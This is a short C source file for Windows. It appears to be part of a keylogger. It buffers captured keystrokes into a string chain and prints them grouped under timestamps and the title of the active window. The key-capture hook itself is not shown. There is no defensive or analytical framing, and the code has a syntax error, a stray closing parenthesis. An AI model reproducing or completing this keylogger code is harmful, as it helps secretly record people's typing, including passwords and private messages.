#include "header.h"

HWND window = NULL;
t_str *str_chain;

void edit_log(short character)
{
	if (character)
	{
		if (window == GetForegroundWindow())
			str_chain = add_str(str_chain, 0, character);
		else
		{
			print_str(str_chain);
			window_title();
			str_chain = add_str(str_chain, 0, character);
		}
	}
	if (cpt_index(str_chain) == 100)
		str_chain = print_str(str_chain));
}

void window_title(void)
{
	SYSTEMTIME time;
	WCHAR window_name[120];

	
	GetSystemTime(&time);
	printf("\n\n# [ %d / %d / %d ]\n# %d:%d\n",	time.wDay, time.wMonth, time.wYear,
											time.wHour, time.wMinute);
	window = GetForegroundWindow();
	GetWindowText(window, window_name, 100);
	wprintf(L"-------- %s -------\n", window_name);
}
